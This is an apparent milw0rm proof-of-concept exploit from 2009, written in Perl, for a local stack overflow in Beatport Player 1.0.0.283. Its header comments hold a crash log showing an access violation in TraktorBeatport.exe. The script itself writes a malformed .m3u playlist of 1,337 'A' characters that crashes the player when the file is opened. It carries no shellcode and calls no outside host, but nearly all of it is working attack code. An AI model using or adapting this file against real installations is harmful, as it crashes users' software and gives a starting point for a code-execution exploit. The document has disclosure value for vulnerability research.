#####################################################################################################
#                   Beatport Player 1.0.0.283 (.M3U File) Local Stack Overflow PoC
#                           Discovered by SirGod   -   www.mortal-team.net
# Error log :
#
#         Logged at Friday, May 01, 2009 14:03:17
#         FileVersion: 1.0.0.283
#         ProductVersion: 1.0.0.0
#         Exception Code: 0xC0000005
#         Exception Addr: 0x001B:0x004317F0
#         Exception Module: TraktorBeatport.exe
#         Exception Description: EXCEPTION_ACCESS_VIOLATION, Attempt to read from address 0x000002BC
#         The memory could not be "read"
#	  http://www.brothersoft.com/beatport-player-download-62319.html         
######################################################################################################
my $chars= "A" x 1337;
my $file="sirgod.m3u";
open(my $FILE, ">>$file") or die "Cannot open $file: $!";
print $FILE $chars;
close($FILE);
print "$file was created";

# milw0rm.com [2009-05-01]
